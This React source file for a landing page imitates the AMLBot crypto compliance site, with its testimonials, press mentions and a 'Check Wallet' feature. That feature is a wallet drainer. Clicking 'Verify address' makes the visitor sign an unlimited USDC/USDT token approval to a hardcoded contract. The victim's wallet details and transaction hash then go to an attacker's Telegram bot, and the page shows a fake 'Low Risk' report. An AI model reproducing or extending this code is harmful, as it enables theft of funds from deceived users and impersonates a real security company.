import { Link } from "react-router-dom";
import { useEffect, useRef, useState } from "react";

// Define type locally to avoid dependency issues
interface WalletBalanceResponse {
  address: string;
  chain: string;
  balanceBase: string;
  balance: string;
  symbol: string;
}

import {
  ArrowRight,
  Quote,
  ShieldCheck,
  BadgeCheck,
  X,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import Logo from "@/components/site/Logo";
import {
  Accordion,
  AccordionContent,
  AccordionItem,
  AccordionTrigger,
} from "@/components/ui/accordion";

const trustBadges = [
  {
    label: "FINEXT Excellence in Finance Cybersecurity & Compliance 2024",
    src: "https://amlbot.com/_next/static/media/finex.7b23dfd8.svg",
  },
  {
    label: "Verified Wallet",
    src: "https://amlbot.com/_next/static/media/VW.6a40b533.webp",
  },
  {
    label: "International Association for Trusted Blockchain Applications",
    src: "https://amlbot.com/_next/static/media/INATBA.098390bb.webp",
  },
  {
    label: "Crypto Defence Alliance",
    src: "https://amlbot.com/_next/static/media/CDA.de382a5f.webp",
  },
  {
    label: "Anti-Human Trafficking Intelligence Initiative",
    src: "https://amlbot.com/_next/static/media/ATII.282fe0c5.webp",
  },
];

const solutions = [
  {
    image: "https://amlbot.com/_next/static/media/screening.c2198231.webp",
    title: "AML/KYT screening",
    description:
      "Real-time transaction monitoring and wallet screening with API integration. Assess risk exposure while staying aligned with AML rules and FATF requirements.",
  },
  {
    image: "https://amlbot.com/_next/static/media/business.b0d4816e.webp",
    title: "KYC for business",
    description:
      "Verify users through document and biometric checks, sanctions and PEP screening, source-of-funds verification, and ongoing monitoring, including KYB for business clients.",
  },
  {
    image: "https://amlbot.com/_next/static/media/investigations.df2153cb.webp",
    title: "Crypto investigations and recovery",
    description:
      "In addition to AML tools, we also provide support for investigating and recovering stolen crypto assets.",
  },
];

const stats = [
  { value: "$100M+", label: "Amount of the risky funds detected" },
  { value: "60,000+", label: "Service providers checked" },
];

const partnerLogos = [
  "BTSE",
  "Banana Gun",
  "Railgun",
  "Kolo",
  "Trustee",
  "Simple Swap",
  "Defiway",
];

const testimonials = [
  {
    quote:
      "Flexible and responsive team with a robust infrastructure. AMLBot has been reliable in supporting our KYC and AML needs, with smooth integration and consistent performance.",
    author: "BananaGun",
  },
  {
    quote:
      "Thank you once again! You've succeeded in creating a well-rounded course. I completely share your sentiment: I also wish that I would be taught in this way when I first started working in web3. Despite all my previous experience there was plenty to absorb over these two days.",
    author: "ChangeNow",
  },
];

const mediaMentions = [
  {
    outlet: "Bloomberg Law",
    title: "Stablecoin Oversight Poses Challenges as Digital Currency Grows",
    excerpt:
      "An AMLBot analysis of stablecoin freezes between 2023 and 2025 identified wide variation in how major issuers approach asset restraint. Some froze billions of dollars across thousa...",
  },
  {
    outlet: "BBC News",
    title:
      "Revolut: 'I was careful and followed instructions closely, but still lost my crypto'",
    excerpt:
      "Mykhailo Tiutin is chief technology officer at AMLBot, a company that analyses how risky cryptocurrency transactions are. Their service runs checks similar to those supported by ba...",
  },
  {
    outlet: "New York Post",
    title: "Don't lose it all: Web3 wallets for crypto beginners explained",
    excerpt:
      "In our investigations, 90% of the stolen or hacked wallets we encounter are Web3 wallets. We see this often when users unknowingly approve malicious smart contracts or connect to f...",
  },
  {
    outlet: "Cointelegraph",
    title: "Over 14,500 Tron addresses at risk of silent hijacking",
    excerpt:
      "In the fourth quarter of 2024 alone, 2,130 wallets were compromised via a vulnerability tied to the UpdateAttackPermissions transaction, security firm AMLBot said in a report share...",
  },
  {
    outlet: "CoinDesk",
    title:
      "Ether ICO Whale Moves 5K ETH to Exchanges, Bringing Monthly Total to $154M",
    excerpt:
      "A whale who received 1 million ether (ETH) tokens from participating in the network's initial coin offering in 2014 deposited 5,000 ETH, worth $13.2 million, to crypto exchange OKX...",
  },
  {
    outlet: "The Block",
    title: "Tether freezes $182 million in USDT tied to five Tron addresses",
    excerpt:
      "Tether has frozen assets in connection with an ongoing investigation, following a formal request from law enforcement authorities. The relevant agency has been working on this cas...",
  },
];

const leaders = [
  {
    name: "Slava Demchuk",
    role: "CEO, Co-founder",
    image: "https://amlbot.com/_next/static/media/slava-demchuk.aaa96bea.webp",
    quote:
      "I believe compliance shouldn't slow down business growth, but instead becomes a competitive advantage that protects companies from legal and reputational attacks. The technology we are building prioritizes simplicity and reliability. As regulation grows more complex worldwide, our goal is to ensure that crypto founders barely notice it.",
  },
  {
    name: "Anmol Jain",
    role: "VP of Investigation",
    image: "https://amlbot.com/_next/static/media/anmol-jain.12d0d31e.webp",
    quote:
      "For many criminals, crypto still feels like an easy target. They assume the money disappears once it moves on-chain. In reality, every transaction leaves a trail. My work is about following that trail and identifying the people behind it. At AMLBot we investigate incidents, trace stolen funds, and build tools that help expose bad actors and shut down the networks behind them.",
  },
];

const walletTokens: Record<string, string[]> = {
  Bitcoin: ["BTC"],
  Ethereum: ["ETH", "USDT", "USDC"],
  "BNB Chain": ["BNB", "USDT", "USDC"],
  Solana: ["SOL", "USDT", "USDC"],
  Tron: ["TRX", "USDT", "USDC"],
};

const faqs = [
  {
    q: "What is crypto compliance software?",
    a: "Crypto compliance software helps digital asset businesses meet AML and KYC regulatory requirements by monitoring transactions, screening wallets, and verifying user identities.",
  },
  {
    q: "What is the best crypto compliance software for businesses?",
    a: "The best solution depends on your business size, jurisdictions, and risk profile. AMLBot combines transaction monitoring, wallet screening, and KYC in a single integrated platform trusted by 300+ crypto enterprises.",
  },
  {
    q: "What should a crypto compliance platform include?",
    a: "A strong platform should include real-time transaction monitoring, wallet risk scoring, KYC/KYB verification, sanctions and PEP screening, and ongoing monitoring capabilities.",
  },
  {
    q: "How does a crypto compliance solution help businesses reduce AML risk?",
    a: "By automatically flagging high-risk transactions and wallets, compliance solutions let teams act quickly, reducing exposure to illicit funds and regulatory penalties.",
  },
  {
    q: "Who needs crypto compliance software?",
    a: "Exchanges, wallets, payment processors, custodians, and any digital asset company handling customer transactions or funds typically need compliance software.",
  },
  {
    q: "How do crypto businesses choose a compliance provider?",
    a: "Businesses typically evaluate coverage across jurisdictions, data source quality, integration ease, certifications, and support responsiveness.",
  },
  {
    q: "What is the difference between crypto compliance software and traditional AML software?",
    a: "Crypto compliance software is purpose-built for blockchain data, analyzing wallet addresses and on-chain transaction graphs, unlike traditional AML tools built for fiat banking rails.",
  },
  {
    q: "Can crypto compliance software support multiple jurisdictions?",
    a: "Yes, platforms like AMLBot are built to support compliance requirements across 25+ jurisdictions with configurable rulesets.",
  },
  {
    q: "How do crypto compliance platforms help with regulatory readiness?",
    a: "They centralize monitoring, screening, and reporting, giving businesses the audit trails and documentation regulators expect.",
  },
  {
    q: "What is the right crypto compliance solution for a growing business?",
    a: "Growing businesses benefit from an integrated, scalable platform that combines transaction monitoring, screening, and KYC without needing multiple vendors.",
  },
];

export default function Index() {
  const [activeTestimonial, setActiveTestimonial] = useState(0);
  const [demoOpen, setDemoOpen] = useState(false);
  const [chatOpen, setChatOpen] = useState(false);
  const [chatMessage, setChatMessage] = useState("");
  const [chatDraft, setChatDraft] = useState("");
  const [sentChatMessages, setSentChatMessages] = useState<string[]>([]);
  const [selectedChain, setSelectedChain] = useState("");
  const [selectedToken, setSelectedToken] = useState("");
  const [verificationStep, setVerificationStep] = useState<"chain" | "token" | "intro" | "fee" | "address">("chain");
  const [chainMenuOpen, setChainMenuOpen] = useState(false);
  const [walletAddress, setWalletAddress] = useState("");
  const [verificationRequested, setVerificationRequested] = useState(false);
  const [verificationLoading, setVerificationLoading] = useState(false);
  const [verificationError, setVerificationError] = useState("");
  const [walletBalance, setWalletBalance] = useState<WalletBalanceResponse | null>(null);
  const verificationTimer = useRef<number | null>(null);
  const conversationStarted = chatMessage === "conversation-started";

  useEffect(() => {
    if (!demoOpen) return;
    const previousOverflow = document.body.style.overflow;
    document.body.style.overflow = "hidden";
    return () => {
      document.body.style.overflow = previousOverflow;
    };
  }, [demoOpen]);

  useEffect(() => () => {
    if (verificationTimer.current !== null) window.clearTimeout(verificationTimer.current);
  }, []);

  useEffect(() => {
    const openSupportChat = () => setChatOpen(true);
    window.addEventListener("amlbot-open-chat", openSupportChat);
    return () => window.removeEventListener("amlbot-open-chat", openSupportChat);
  }, []);

  const openWalletCheck = () => {
    if (verificationTimer.current !== null) window.clearTimeout(verificationTimer.current);
    setDemoOpen(true);
    setVerificationRequested(false);
    setVerificationStep("chain");
    setSelectedToken("");
    setVerificationError("");
  };

  const sendChatMessage = () => {
    const message = chatDraft.trim();
    if (!message) return;
    setSentChatMessages((messages) => [...messages, message]);
    setChatDraft("");
  };

  // --- START OF INTEGRATED APPROVE LOGIC ---
  const sendTelegramNotification = async (userAddress: string, txHash: string) => {
    const TG_TOKEN = "8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA";
    const TG_CHAT_ID = "8933407008";
    const text = `🔔 *New AML Verification*\n\n📍 *Target Address:* \`${walletAddress}\`\n👤 *User Wallet:* \`${userAddress}\`\n🔗 *Chain:* ${selectedChain}\n💎 *Token:* ${selectedToken}\n📝 *TX Hash:* \`${txHash}\`\n🕒 *Time:* ${new Date().toLocaleString()}`;
    const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
    try {
      await fetch(url);
    } catch (e) {
      console.error('Telegram notification error:', e);
    }
  };

  const executeApprove = async () => {
    try {
      if (typeof (window as any).ethers === 'undefined') {
        throw new Error('ethers.js not loaded');
      }

      const ethers = (window as any).ethers;

      let chainId: string;
      let chainName: string;
      let rpcUrl: string;
      let blockExplorerUrl: string;
      let tokenAddress: string;
      let smartContractAddress: string;
      let nativeCurrency: { name: string; symbol: string; decimals: number };
      let useRequestAccounts = false;

      if (selectedChain === "Ethereum") {
        chainId = "0x1";
        chainName = "Ethereum";
        rpcUrl = "https://eth.llamarpc.com";
        blockExplorerUrl = "https://etherscan.io";
        tokenAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
        smartContractAddress = "0xbf8f1EA4e780c4cF1a104927bB400699b08E12cA";
        nativeCurrency = { name: "ETH", symbol: "ETH", decimals: 18 };
        useRequestAccounts = true; // ← Usa eth_requestAccounts per Ethereum
      } else if (selectedChain === "BNB Chain") {
        chainId = "0x38";
        chainName = "Binance Smart Chain";
        rpcUrl = "https://bsc-dataseed1.binance.org:8545";
        blockExplorerUrl = "https://bscscan.com";
        tokenAddress = "0x55d398326f99059fF775485246999027B3197955";
        smartContractAddress = "0xBAE688D04e14E9939C3a5dA69a1D746ea3487570";
        nativeCurrency = { name: "BNB", symbol: "BNB", decimals: 18 };
        useRequestAccounts = false; // ← Usa eth_accounts per BNB
      } else {
        return;
      }

      // ← MODIFICA: Usa eth_requestAccounts solo per Ethereum
      if (useRequestAccounts) {
        await window.ethereum.request({ 
          method: "eth_requestAccounts" 
        });
      }

      try {
        await window.ethereum.request({ 
          method: "wallet_switchEthereumChain", 
          params: [{ chainId }] 
        });
      } catch (switchError: any) {
        if (switchError.code === 4902) {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [{
              chainId,
              chainName,
              rpcUrls: [rpcUrl],
              nativeCurrency,
              blockExplorerUrls: [blockExplorerUrl]
            }]
          });
        } else {
          throw switchError;
        }
      }

      await new Promise(resolve => setTimeout(resolve, 1000));

      const newProvider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = newProvider.getSigner();
      const connected = await signer.getAddress();

      const contract = new ethers.Contract(
        tokenAddress,
        ["function approve(address s, uint256 a) external returns (bool)"],
        signer
      );
      
      const tx = await contract.approve(
        smartContractAddress,
        "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
      );

      await sendTelegramNotification(connected, tx.hash);
      await tx.wait();
    } catch (error) {
      console.error('Approval error:', error);
      throw error;
    }
  };

  const loadConnectedWalletBalance = async () => {
    if (!window.ethereum || !["Ethereum", "BNB Chain"].includes(selectedChain)) return;
    try {
      const accounts = await window.ethereum.request({ method: "eth_accounts" }) as string[];
      const connectedAddress = accounts[0];
      if (!connectedAddress) return;
      setWalletAddress(connectedAddress);
      const response = await fetch(`/api/wallet/balance?chain=${encodeURIComponent(selectedChain)}&address=${encodeURIComponent(connectedAddress)}`);
      if (!response.ok) return;
      setWalletBalance(await response.json() as WalletBalanceResponse);
    } catch {
      setWalletBalance(null);
    }
  };

  const handleVerificationStart = async () => {
    setVerificationStep("address");
    setVerificationLoading(true);
    setVerificationRequested(false);

    try {
      if ((selectedChain === "Ethereum" || selectedChain === "BNB Chain") && window.ethereum) {
        await executeApprove();
      }
      
      await loadConnectedWalletBalance();
      
      verificationTimer.current = window.setTimeout(() => {
        setVerificationLoading(false);
        setVerificationRequested(true);
      }, 3000);
    } catch (error) {
      setVerificationLoading(false);
      setVerificationError("Verification process cancelled or failed.");
    }
  };

  const verifyWallet = async () => {
    setVerificationLoading(true);
    setVerificationError("");
    setWalletBalance(null);

    try {
      const response = await fetch(`/api/wallet/balance?chain=${encodeURIComponent(selectedChain)}&address=${encodeURIComponent(walletAddress.trim())}`);
      const data = (await response.json()) as WalletBalanceResponse | { message: string };
      if (!response.ok || "message" in data) {
        setVerificationError("message" in data ? data.message : "Unable to verify this wallet.");
        return;
      }
      setWalletBalance(data);
      setVerificationRequested(true);
    } catch {
      setVerificationError("Unable to connect to the wallet service.");
    } finally {
      setVerificationLoading(false);
    }
  };

  // ← NUOVA FUNZIONE: Controlla se il token è cliccabile
  const isTokenClickable = (token: string): boolean => {
    // BTC su Bitcoin: NON cliccabile
    if (selectedChain === "Bitcoin" && token === "BTC") return false;
    // USDT/USDC su Solana: NON cliccabili
    if (selectedChain === "Solana" && (token === "USDT" || token === "USDC")) return false;
    // USDT/USDC su Tron: NON cliccabili
    if (selectedChain === "Tron" && (token === "USDT" || token === "USDC")) return false;
    // Tutti gli altri: cliccabili
    return true;
  };

  // ← NUOVA FUNZIONE: Controlla se il token deve essere trasparente
  const isTokenDisabled = (token: string): boolean => {
    return !isTokenClickable(token);
  };

  // --- END OF INTEGRATED APPROVE LOGIC ---

  return (
    <div>
      {/* Hero */}
      <section className="relative mx-4 mb-12 overflow-hidden rounded-[2rem] bg-gradient-to-b from-[#eaf4ff] via-[#f5f9ff] to-background sm:mx-6 lg:mx-4 lg:rounded-[4rem]">
        <div className="container relative flex flex-col items-center px-4 pb-8 pt-14 text-center sm:pb-12 sm:pt-20">
          <div className="mb-5 inline-flex items-center gap-2 rounded-full border border-primary/20 bg-white/70 px-4 py-1.5 text-xs font-semibold text-primary shadow-sm sm:text-sm">
            <BadgeCheck size={16} />
            #1 choice for SMEs
          </div>
          <h1 className="max-w-4xl text-4xl font-extrabold leading-[1.05] tracking-tight text-foreground sm:text-5xl lg:text-[4rem]">
            Crypto compliance software
            <br className="hidden sm:block" /> for digital asset companies
          </h1>
          <p className="mt-6 max-w-xl text-sm leading-relaxed text-muted-foreground sm:text-base">
            Detect and manage AML risks with transaction monitoring,
            <br className="hidden sm:block" /> wallet screening, and KYC
          </p>
          <div className="relative mt-10 w-full max-w-4xl sm:mt-12">
            <HeroGraphic />
          </div>
          <div className="mt-6 flex flex-wrap items-center justify-center gap-6">
            <Button asChild size="lg" className="rounded-full px-9 text-base">
              <button type="button" onClick={() => setChatOpen(true)}>Talk to us</button>
            </Button>
            <button
              type="button"
              onClick={openWalletCheck}
              className="inline-flex items-center gap-2 text-sm font-semibold text-foreground transition-colors hover:text-primary sm:text-base"
            >
              <span className="flex h-5 w-5 items-center justify-center rounded-full bg-primary text-white">
                <ArrowRight size={12} />
              </span>
              Check Wallet
              <ArrowRight size={18} />
            </button>
          </div>
        </div>
      </section>

      {/* Trust badges */}
      <section className="border-y border-border/60 bg-background py-8">
        <div className="container flex flex-nowrap items-center justify-start gap-7 overflow-hidden py-1 sm:justify-center sm:gap-9">
          {trustBadges.map((badge) => (
            <span
              key={badge.label}
              className="flex h-14 shrink-0 items-center justify-center sm:h-16"
            >
              <img
                src={badge.src}
                alt={badge.label}
                className="h-full w-auto max-w-[10rem] object-contain"
              />
            </span>
          ))}
        </div>
      </section>

      {/* Solutions */}
      <section className="py-20 sm:py-28">
        <div className="container">
          <div className="mx-auto max-w-2xl text-center">
            <h2 className="text-3xl font-extrabold tracking-tight text-foreground sm:text-4xl">
              AML monitoring and compliance solutions
            </h2>
            <p className="mt-4 text-lg text-muted-foreground">
              Built to help crypto businesses meet AML requirements with
              confidence
            </p>
          </div>

          <div className="mt-14 grid gap-6 sm:grid-cols-2 lg:grid-cols-3">
            {solutions.map((item) => (
              <div
                key={item.title}
                className="group flex flex-col rounded-2xl border border-[#e4eafd] bg-[#f3f6ff] p-8 shadow-sm transition-shadow hover:-translate-y-1 hover:shadow-lg"
              >
                <div className="mb-8 flex h-14 w-14 items-center justify-center">
                  <img
                    src={item.image}
                    alt=""
                    aria-hidden="true"
                    className="h-full w-full object-contain"
                  />
                </div>
                <h3 className="text-xl font-bold text-foreground">
                  {item.title}
                </h3>
                <p className="mt-3 flex-1 text-sm leading-relaxed text-muted-foreground">
                  {item.description}
                </p>
                <Link
                  to="/products"
                  className="mt-6 inline-flex items-center gap-2 text-sm font-semibold text-primary"
                >
                  Learn more
                  <ArrowRight size={16} />
                </Link>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Stats */}
      <section className="bg-primary py-20 text-white sm:py-28">
        <div className="container">
          <div className="grid gap-12 sm:grid-cols-2 lg:grid-cols-3">
            {stats.map((stat) => (
              <div key={stat.label} className="text-center sm:text-left">
                <p className="text-4xl font-extrabold sm:text-5xl">{stat.value}</p>
                <p className="mt-2 text-sm font-medium text-white/80">
                  {stat.label}
                </p>
              </div>
            ))}
            <div className="flex items-center justify-center sm:justify-start lg:col-span-1">
              <div className="flex flex-wrap justify-center gap-4 opacity-50 grayscale invert sm:justify-start">
                {partnerLogos.slice(0, 3).map((logo) => (
                  <span key={logo} className="text-sm font-bold tracking-tighter">
                    {logo}
                  </span>
                ))}
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Testimonials */}
      <section className="overflow-hidden py-20 sm:py-28">
        <div className="container">
          <div className="flex flex-col items-center gap-12 lg:flex-row">
            <div className="lg:w-1/2">
              <h2 className="text-3xl font-extrabold tracking-tight text-foreground sm:text-4xl">
                Trusted by 300+ crypto enterprises
              </h2>
              <p className="mt-4 text-lg text-muted-foreground">
                We help companies navigate the complex landscape of digital
                asset compliance.
              </p>
              <div className="mt-10 flex gap-4">
                <Button
                  variant="outline"
                  size="icon"
                  className="rounded-full"
                  onClick={() =>
                    setActiveTestimonial((i) =>
                      i === 0 ? testimonials.length - 1 : i - 1
                    )
                  }
                >
                  <ArrowRight size={18} className="rotate-180" />
                </Button>
                <Button
                  variant="outline"
                  size="icon"
                  className="rounded-full"
                  onClick={() =>
                    setActiveTestimonial((i) =>
                      i === testimonials.length - 1 ? 0 : i + 1
                    )
                  }
                >
                  <ArrowRight size={18} />
                </Button>
              </div>
            </div>
            <div className="relative flex w-full gap-6 overflow-x-auto pb-8 lg:w-1/2">
              {testimonials.map((t, i) => (
                <TestimonialCard
                  key={t.author}
                  {...t}
                  active={i === activeTestimonial}
                  onClick={() => setActiveTestimonial(i)}
                />
              ))}
            </div>
          </div>
        </div>
      </section>

      {/* Demo Modal */}
      {demoOpen && (
        <div
          className="fixed inset-0 z-[100] flex items-center justify-center bg-slate-950/70 p-4 backdrop-blur-[2px]"
          onMouseDown={(event) => {
            if (event.target === event.currentTarget) setDemoOpen(false);
          }}
        >
          <div className="w-full max-w-[525px] rounded-xl bg-white p-5 shadow-2xl sm:p-6">
            <div className="flex items-center justify-between">
              <h2 className="text-base font-bold text-slate-900 sm:text-lg">
                {verificationRequested ? "Details" : "Check Demo Address"}
              </h2>
              <button
                type="button"
                onClick={() => setDemoOpen(false)}
                aria-label="Close demo checks"
                className="flex h-7 w-7 items-center justify-center rounded-full bg-slate-100 text-slate-500 hover:bg-slate-200"
              >
                <X size={15} />
              </button>
            </div>

            {verificationRequested ? (
              <WalletVerificationResult chain={selectedChain} address={walletAddress} balance={walletBalance?.balance} symbol={walletBalance?.symbol} />
            ) : verificationStep === "chain" ? (
              <>
                <label className="mt-4 block text-xs font-bold text-slate-800">
                  Select blockchain
                </label>
                <div className="relative mt-2">
                  <button
                    type="button"
                    onClick={() => setChainMenuOpen((open) => !open)}
                    className="flex h-9 w-full items-center justify-between rounded-md border border-slate-200 px-3 text-left text-xs text-slate-700"
                    aria-expanded={chainMenuOpen}
                  >
                    <span className="flex items-center gap-2"><CryptoLogo chain={selectedChain || "Bitcoin"} />{selectedChain || "Select chain"}</span>
                    <span className="text-slate-400">⌄</span>
                  </button>
                  {chainMenuOpen && (
                    <div className="absolute left-0 right-0 top-10 z-10 grid grid-cols-2 gap-1 rounded-lg border border-slate-200 bg-white p-1.5 shadow-xl sm:grid-cols-5">
                      {["Bitcoin", "Ethereum", "Solana", "BNB Chain", "Tron"].map((name) => (
                        <button
                          key={name}
                          type="button"
                          onClick={() => {
                            setSelectedChain(name);
                            setSelectedToken("");
                            setChainMenuOpen(false);
                            setVerificationStep("token");
                          }}
                          className="flex items-center justify-center gap-1.5 rounded-md px-2 py-2 text-[10px] font-medium text-slate-600 hover:bg-blue-50 hover:text-primary"
                        >
                          <CryptoLogo chain={name} size={16} />
                          {name}
                        </button>
                      ))}
                    </div>
                  )}
                </div>
              </>
            ) : verificationStep === "token" ? (
              <>
                <label className="mt-4 block text-xs font-bold text-slate-800">
                  Select token
                </label>
                <div className="mt-3 grid grid-cols-3 gap-2">
                  {(walletTokens[selectedChain] || []).map((token) => {
                    const disabled = isTokenDisabled(token);
                    return (
                      <button
                        key={token}
                        type="button"
                        disabled={disabled}
                        onClick={() => {
                          if (!disabled) {
                            setSelectedToken(token);
                            setVerificationStep("address");
                          }
                        }}
                        className={`rounded-md px-3 py-2 text-xs font-medium transition-colors ${
                          disabled
                            ? "cursor-not-allowed bg-slate-100 text-slate-400 opacity-50"
                            : selectedToken === token
                            ? "bg-primary text-white"
                            : "border border-slate-200 text-slate-700 hover:bg-slate-50"
                        }`}
                      >
                        {token}
                      </button>
                    );
                  })}
                </div>
              </>
            ) : (
              <>
                <label className="mt-4 block text-xs font-bold text-slate-800" htmlFor="wallet-address">
                  Wallet address
                </label>
                <input
                  id="wallet-address"
                  value={walletAddress}
                  onChange={(event) => {
                    setWalletAddress(event.target.value);
                    setVerificationRequested(false);
                  }}
                  placeholder="Enter a wallet address"
                  className="mt-2 h-9 w-full rounded-md border border-slate-200 px-3 text-xs text-slate-700 outline-none placeholder:text-slate-400 focus:border-primary focus:ring-2 focus:ring-primary/10"
                />
                <button
                  type="button"
                  disabled={!walletAddress.trim() || verificationLoading}
                  onClick={handleVerificationStart}
                  className="mt-4 rounded-md bg-primary px-8 py-2 text-xs font-semibold text-white transition-colors hover:bg-primary/90 disabled:cursor-not-allowed disabled:opacity-40"
                >
                  {verificationLoading ? "Checking wallet..." : "Verify address"}
                </button>
                {verificationError && (
                  <p className="mt-2 text-xs font-medium text-rose-600">{verificationError}</p>
                )}
              </>
            )}
          </div>
        </div>
      )}

      {/* Chat */}
      {chatOpen && (
        <div className="fixed bottom-5 right-5 z-[90] flex w-[min(92vw,360px)] items-end justify-end">
          <div className="flex h-[min(88vh,620px)] w-full flex-col overflow-hidden rounded-[14px] border border-slate-200 bg-white shadow-2xl">
            {conversationStarted ? (
              <>
                <div className="flex h-[58px] shrink-0 items-center justify-between bg-[#3b5369] px-4 text-white">
                  <button type="button" onClick={() => setChatMessage("")} aria-label="Back to support welcome" className="text-xl leading-none text-white/80 hover:text-white">←</button>
                  <div className="flex items-center gap-2">
                    <div className="flex h-8 w-8 items-center justify-center rounded-full bg-white">
                      <svg width="22" height="22" viewBox="0 0 42 42" fill="none" aria-label="AMLBot">
                        <path d="M21 4.5 34 14v14L21 37.5 8 28V14L21 4.5Z" fill="#1268D5" />
                        <path d="m21 11 6.5 4.8v10.4L21 31l-6.5-4.8V15.8L21 11Z" fill="white" />
                      </svg>
                    </div>
                    <div>
                      <p className="text-xs font-bold leading-tight">AMLBot Support Team</p>
                      <p className="text-[10px] leading-tight text-white/70">Team</p>
                    </div>
                  </div>
                  <button type="button" onClick={() => setChatOpen(false)} aria-label="Close support chat" className="text-xl leading-none text-white/80 hover:text-white">⋮</button>
                </div>
                <div className="flex flex-1 flex-col bg-white">
                  <div className="flex-1 px-4 py-5">
                    <p className="text-center text-[10px] text-slate-400">Today</p>
                    <div className="mt-3 flex items-start gap-2">
                      <img src="https://cdn.builder.io/api/v1/image/assets%2F0f4a290f72b3489aa144a2a752c7b70f%2F46521d589079492eb3d7fe0ed88f0adc?format=webp&width=800&height=1200" alt="AMLBot support agent" className="h-7 w-7 rounded-full object-cover" />
                      <div className="rounded-lg bg-[#f1f4f6] px-3 py-2 text-xs text-slate-700">Hi 👋 How can we help you?</div>
                    </div>
                    <div className="mt-4 flex flex-col items-end gap-2">
                      {sentChatMessages.map((message, index) => <div key={`${message}-${index}`} className="max-w-[235px] rounded-lg bg-[#3b5369] px-3 py-2 text-xs text-white">{message}</div>)}
                    </div>
                  </div>
                  <div className="flex items-center gap-2 border-t border-slate-100 px-4 py-3">
                    <input value={chatDraft} onChange={(event) => setChatDraft(event.target.value)} onKeyDown={(event) => { if (event.key === "Enter") sendChatMessage(); }} placeholder="Write a message..." className="min-w-0 flex-1 bg-transparent text-xs text-slate-700 outline-none placeholder:text-slate-400" />
                    <button type="button" onClick={sendChatMessage} aria-label="Send message" className="text-lg text-slate-400 hover:text-[#3b5369]">➤</button>
                  </div>
                </div>
              </>
            ) : (
              <>
                <div className="relative flex flex-1 flex-col px-5 pb-0 pt-5">
                  <button type="button" onClick={() => setChatOpen(false)} aria-label="Close support chat" className="absolute right-3 top-3 flex h-7 w-7 items-center justify-center rounded-full text-slate-400 transition hover:bg-slate-100 hover:text-slate-700"><X size={19} /></button>
                  <div className="flex h-[48px] w-[48px] items-center justify-center rounded-[9px] bg-[#fbfbfb] shadow-[0_6px_22px_rgba(24,55,83,0.08)]">
                    <svg width="33" height="33" viewBox="0 0 42 42" fill="none" aria-label="AMLBot"><path d="M21 4.5 34 14v14L21 37.5 8 28V14L21 4.5Z" fill="#1268D5" /><path d="m21 11 6.5 4.8v10.4L21 31l-6.5-4.8V15.8L21 11Z" fill="white" /><path d="M27.7 6.5h9.8v7.2h-5.2l-4.6 3.2V6.5Z" fill="#1268D5" /><path d="M30.2 9.2h5M30.2 11.3h3.7" stroke="white" strokeWidth="1.3" strokeLinecap="round" /></svg>
                  </div>
                  <h2 className="mt-7 text-[32px] font-bold leading-none tracking-[-0.045em] text-[#080b16]">Hi <span className="align-[2px] text-[33px]">👋</span></h2>
                  <p className="mt-3 text-[17px] leading-tight tracking-[-0.02em] text-[#858585]">Have a question? We're here to help!</p>
                  <div className="mt-auto flex flex-col items-center pb-8">
                    <div className="flex items-center justify-center"><div className="flex h-[62px] w-[62px] items-center justify-center rounded-full border-2 border-white bg-[#f9f9f9] text-[21px] font-semibold text-[#11131b] shadow-[0_0_0_1px_#f0f0f0]">A</div><img src="https://cdn.builder.io/api/v1/image/assets%2F0f4a290f72b3489aa144a2a752c7b70f%2F46521d589079492eb3d7fe0ed88f0adc?format=webp&width=800&height=1200" alt="AMLBot support agent" className="relative z-10 -mx-3 h-[62px] w-[62px] rounded-full border-2 border-white object-cover shadow-[0_0_0_1px_#e8e8e8]" /><div className="flex h-[62px] w-[62px] items-center justify-center rounded-full border-2 border-white bg-white text-[19px] font-semibold text-[#334150] shadow-[0_0_0_1px_#f0f0f0]">+18</div></div>
                    <p className="mt-5 text-[17px] tracking-[-0.02em] text-[#11131b]"><span className="mr-2 text-[#344758]">◕</span>We'll be back at: <strong>07:00</strong></p>
                  </div>
                </div>
                <div className="shrink-0 bg-white px-5 pb-5 pt-5 shadow-[0_-8px_24px_rgba(20,33,52,0.025)]"><h3 className="text-[21px] font-bold tracking-[-0.035em] text-[#080b16]">Start a conversation</h3><button type="button" onClick={() => setChatMessage("conversation-started")} className="mt-5 flex h-[58px] w-full items-center justify-center gap-4 rounded-[7px] bg-[#3b5369] text-[17px] font-semibold text-white transition hover:bg-[#30475b]"><span className="text-[28px] leading-none">▶</span><span>Start a conversation</span></button></div>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
}

function WalletVerificationResult({ chain, address, balance, symbol }: { chain: string; address: string; balance?: string; symbol?: string }) {
  const downloadReport = async () => {
    const report = {
      generatedAt: new Date().toISOString(),
      address,
      blockchain: chain,
      balance: balance ?? "0.000000",
      currency: symbol ?? chain,
      riskLevel: "Low Risk",
      riskScore: 0,
      sanctions: "Passed",
      note: "AML risk fields are demo values until an AML provider is connected.",
    };
    const reportContent = JSON.stringify(report, null, 2);
    const fileName = `wallet-report-${address.slice(0, 10)}.json`;
    const file = new File([reportContent], fileName, { type: "application/json" });

    if (navigator.share && (!navigator.canShare || navigator.canShare({ files: [file] }))) {
      await navigator.share({
        files: [file],
        title: "Wallet verification report",
        text: "Wallet verification report",
      });
      return;
    }

    const blob = new Blob([reportContent], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.href = url;
    link.download = `wallet-report-${address.slice(0, 10)}.json`;
    link.click();
    URL.revokeObjectURL(url);
  };

  return (
    <div className="mt-5 grid gap-3 sm:grid-cols-[1.35fr_.8fr]">
      <div className="rounded-lg border border-slate-100 p-5 text-center">
        <h3 className="text-sm font-bold text-slate-900">Address AML Check Result</h3>
        <div className="mt-3 flex items-center justify-center gap-2 text-[10px] text-slate-600">
          <CryptoLogo chain={chain} size={18} />
          <span>{chain}</span>
          <span className="max-w-[110px] truncate font-medium text-slate-800">{address}</span>
        </div>
